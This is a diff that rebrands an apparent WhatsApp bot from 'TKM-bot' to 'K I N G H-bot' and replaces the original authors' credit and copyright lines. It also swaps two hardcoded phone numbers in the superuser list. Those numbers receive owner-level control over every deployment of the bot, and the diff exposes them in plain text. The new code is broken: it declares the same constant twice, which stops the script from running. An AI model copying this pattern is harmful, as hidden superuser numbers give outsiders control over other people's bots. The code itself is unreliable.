@@ -167,7 +167,7 @@ setTimeout(() => {
             logger: pino({
                 level: "silent"
             }),
-            browser: ["TKM-bot", "safari", "1.0.0"],
+            browser: ["K I N G H-bot", "safari", "1.0.0"],
             printQRInTerminal: true,
             fireInitQueries: false,
             shouldSyncHistoryMessage: true,
@@ -279,13 +279,13 @@ setTimeout(() => {
             var membreGroupe = verifGroupe ? ms.key.participant : "";
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const danny = "2348098309204";
-            const tkm = "263785028126";
+            const kingh = "254768037132";
+            const kingh = "254723780545";
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [
                 servBot,
-                danny,
-                tkm,
+                kingh,
+                kingh,
                 conf.NUMERO_OWNER
             ].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -1310,7 +1310,7 @@ setTimeout(() => {
                 if (conf.DP.toLowerCase() === "yes") {
                     let cmsg = `
 ╔───⬡
-┃ ┃⬡TKM bot⬡┃
+┃ ┃⬡K I N G H-bot⬡┃
 ┃    Prefix : [ ${prefixe} ]
 ┃    Mode :${md}
 ┃    Total Commandes : ${evt.cm.length}︎
@@ -1320,10 +1320,10 @@ setTimeout(() => {
  report any. problems to the devs:)
  Thanks for supporting
  this project
- property of Cod3Uchiha
- property of Takudzwa Mlambo
- © Cod3Uchiha
- © Takudzwa Mlambo
+ property of muthee kingh
+ property of kingh
+ © muthee kingh
+ © kingh
 ╚─────────────────···▸▸`;
                     await zk.sendMessage(zk.user.id, {
                         text: cmsg
